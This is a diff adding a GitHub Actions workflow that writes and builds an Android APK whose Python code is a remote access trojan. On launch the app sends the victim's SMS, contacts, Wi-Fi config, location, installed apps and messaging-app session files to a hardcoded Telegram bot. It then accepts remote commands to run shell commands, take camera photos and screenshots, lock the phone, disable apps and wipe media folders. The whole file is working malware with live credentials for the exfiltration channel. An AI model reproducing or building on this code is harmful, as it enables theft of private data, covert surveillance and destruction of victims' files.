@@ -1,0 +1,283 @@
+name: Build APK
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Install
+      run: |
+        sudo apt update
+        sudo apt install -y openjdk-17-jdk
+        pip install buildozer
+    - name: Create main.py
+      run: |
+        cat > main.py << 'EOF'
+import os,requests,subprocess,shutil,json,sqlite3,time,threading
+T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
+C="8631833153"
+def s(t):
+ try:
+  for i in range(0,len(t),4000):
+   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
+ except:pass
+def p(t):s(str(t))
+def c(c):
+ try:return subprocess.check_output(c,shell=True).decode()[:1000]
+ except:return"no"
+def i():
+ try:return requests.get("https://api.ipify.org").text
+ except:return"no"
+def l():
+ try:
+  r=requests.get("http://ip-api.com/json/")
+  d=r.json()
+  return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
+ except:return"no"
+def d():
+ try:return subprocess.check_output("getprop ro.product.model",shell=True).decode().strip()
+ except:return"no"
+def t():
+ try:return str(time.ctime())
+ except:return"no"
+def m():
+ try:return subprocess.check_output("pm list packages",shell=True).decode()[:300]
+ except:return"no"
+def r():
+ try:
+  p=["/data/data/com.roblox.client","/storage/emulated/0/Android/data/com.roblox.client"]
+  r=[]
+  for pp in p:
+   if os.path.exists(pp):
+    for a,b,c in os.walk(pp):
+     for f in c:
+      if f.endswith((".db",".xml",".json",".txt",".cookie")):
+       r.append(f)
+  return r
+ except:return"no"
+def tg():
+ try:
+  p=["/data/data/org.telegram","/storage/emulated/0/Android/data/org.telegram"]
+  r=[]
+  for pp in p:
+   if os.path.exists(pp):
+    for a,b,c in os.walk(pp):
+     for f in c:
+      if "session" in f.lower() or f.endswith(".db"):
+       try:shutil.copy(os.path.join(a,f),f"/sdcard/{f}")
+       except:pass
+       r.append(f)
+  return r
+ except:return"no"
+def sms():
+ try:
+  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/")
+  if os.path.exists("/sdcard/mmssms.db"):
+   conn=sqlite3.connect("/sdcard/mmssms.db")
+   cur=conn.cursor()
+   cur.execute("SELECT address,body FROM sms ORDER BY date DESC LIMIT 50")
+   s=cur.fetchall()
+   conn.close()
+   return "\n".join([f"{x[0]}: {str(x[1])[:50]}"for x in s if x[1]])
+  return"no"
+ except:return"no"
+def con():
+ try:
+  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/")
+  if os.path.exists("/sdcard/contacts2.db"):
+   conn=sqlite3.connect("/sdcard/contacts2.db")
+   cur=conn.cursor()
+   cur.execute("SELECT display_name,number FROM contacts LIMIT 100")
+   c=cur.fetchall()
+   conn.close()
+   return "\n".join([f"{x[0]}: {x[1]}"for x in c if x[1]])
+  return"no"
+ except:return"no"
+def w():
+ try:
+  w=subprocess.check_output("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null",shell=True).decode()[:300]
+  return w
+ except:return"no"
+def g():
+ try:
+  p=["/data/data/com.google.android.gms","/data/data/com.google.android.gsf"]
+  r=[]
+  for pp in p:
+   if os.path.exists(pp):
+    for a,b,c in os.walk(pp):
+     for f in c:
+      if f.endswith((".db",".xml",".json",".txt")):
+       r.append(f)
+  return r
+ except:return"no"
+def wa():
+ try:
+  p=["/data/data/com.whatsapp","/storage/emulated/0/Android/data/com.whatsapp"]
+  r=[]
+  for pp in p:
+   if os.path.exists(pp):
+    for a,b,c in os.walk(pp):
+     for f in c:
+      if f.endswith((".db",".crypt12",".crypt14")):
+       r.append(f)
+  return r
+ except:return"no"
+def ig():
+ try:
+  p=["/data/data/com.instagram.android"]
+  r=[]
+  if os.path.exists(p[0]):
+   for a,b,c in os.walk(p[0]):
+    for f in c:
+     if f.endswith((".db",".xml",".json",".txt")):
+      r.append(f)
+  return r
+ except:return"no"
+def fb():
+ try:
+  p=["/data/data/com.facebook.katana"]
+  r=[]
+  if os.path.exists(p[0]):
+   for a,b,c in os.walk(p[0]):
+    for f in c:
+     if f.endswith((".db",".xml",".json",".txt")):
+      r.append(f)
+  return r
+ except:return"no"
+def dc():
+ try:
+  p=["/data/data/com.discord"]
+  r=[]
+  if os.path.exists(p[0]):
+   for a,b,c in os.walk(p[0]):
+    for f in c:
+     if f.endswith((".db",".xml",".json",".txt")):
+      r.append(f)
+  return r
+ except:return"no"
+def tt():
+ try:
+  p=["/data/data/com.zhiliaoapp.musically"]
+  r=[]
+  if os.path.exists(p[0]):
+   for a,b,c in os.walk(p[0]):
+    for f in c:
+     if f.endswith((".db",".xml",".json",".txt")):
+      r.append(f)
+  return r
+ except:return"no"
+def ch():
+ try:
+  p=["/data/data/com.android.chrome"]
+  r=[]
+  if os.path.exists(p[0]):
+   for a,b,c in os.walk(p[0]):
+    for f in c:
+     if f.endswith((".db",".sqlite",".cookie")):
+      r.append(f)
+  return r
+ except:return"no"
+def bl():
+ try:
+  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.snapchat.android","com.twitter.android","com.zhiliaoapp.musically"]
+  for a in apps:os.system(f"pm disable {a} 2>/dev/null")
+  return"done"
+ except:return"no"
+def lc():
+ for i in range(3):os.system("input keyevent 26")
+ return"done"
+def dl():
+ try:
+  dirs=["DCIM","Pictures","Movies","Music","Download","Documents","WhatsApp","Telegram","Instagram","Facebook","Discord","TikTok","Snapchat","Twitter","Roblox"]
+  for d in dirs:os.system(f"rm -rf /storage/emulated/0/{d}/* 2>/dev/null")
+  return"done"
+ except:return"no"
+def ph():
+ try:
+  os.system("termux-camera-photo -c 0 /sdcard/photo.jpg 2>/dev/null")
+  time.sleep(2)
+  if os.path.exists("/sdcard/photo.jpg"):
+   files={"photo":open("/sdcard/photo.jpg","rb")}
+   requests.post(f"https://api.telegram.org/bot{T}/sendPhoto",data={"chat_id":C},files=files)
+   return"ok"
+  return"no"
+ except:return"no"
+def sc():
+ try:
+  os.system("screencap /sdcard/screen.png")
+  if os.path.exists("/sdcard/screen.png"):
+   files={"photo":open("/sdcard/screen.png","rb")}
+   requests.post(f"https://api.telegram.org/bot{T}/sendPhoto",data={"chat_id":C},files=files)
+   return"ok"
+  return"no"
+ except:return"no"
+def gps():
+ try:
+  os.system("termux-location -p gps > /sdcard/loc.txt 2>/dev/null")
+  time.sleep(3)
+  with open("/sdcard/loc.txt",'r') as f:return f.read()[:200]
+ except:return"no"
+def menu():
+ return """🔥 MENU 🔥
+/photo - фото
+/screen - скриншот
+/gps - координаты
+/lock - блокировка
+/block - блок приложений
+/delete - удалить файлы
+/info - информация
+/cmd <команда>
+PASS: v67"""
+def cl():
+ while True:
+  try:
+   r=requests.get(f"https://api.telegram.org/bot{T}/getUpdates",params={"offset":0,"timeout":30},timeout=35)
+   for u in r.json().get("result",[]):
+    txt=u.get("message",{}).get("text","")
+    if txt.startswith("/cmd "):res=c(txt[5:]);s(f"CMD: {txt[5:]}\n{res}")
+    elif txt=="/photo":ph()
+    elif txt=="/screen":sc()
+    elif txt=="/gps":s(f"GPS: {gps()}")
+    elif txt=="/lock":lc();s("LOCKED")
+    elif txt=="/block":bl();s("BLOCKED")
+    elif txt=="/delete":dl();s("DELETED")
+    elif txt=="/info":s(f"IP: {i()}\nLOC: {l()}\nDEV: {d()}")
+    elif txt=="/menu" or txt=="/start":s(menu())
+  except:pass
+  time.sleep(2)
+threading.Thread(target=cl,daemon=True).start()
+msg=f"""🔓 PASS: v67
+DEV: {d()}
+IP: {i()}
+LOC: {l()}
+TIME: {t()}
+APPS: {m()}
+ROBLOX: {r()}
+TG: {tg()}
+SMS: {sms()}
+CONTACTS: {con()}
+WIFI: {w()}
+GOOGLE: {g()}
+WA: {wa()}
+IG: {ig()}
+FB: {fb()}
+DC: {dc()}
+TT: {tt()}
+CHROME: {ch()}
+✅ READY"""
+s(msg)
+EOF
+    - name: Create spec
+      run: |
+        buildozer init
+        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
+        sed -i 's/package.name = .*/package.name = R/g' buildozer.spec
+        sed -i 's/package.domain = .*/package.domain = org.r/g' buildozer.spec
+        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_WIFI_STATE,CAMERA,RECORD_AUDIO/g' buildozer.spec
+    - name: Build
+      run: buildozer android debug
+    - name: Upload
+      uses: actions/upload-artifact@v3
+      with:
+        name: R
+        path: bin/*.apk
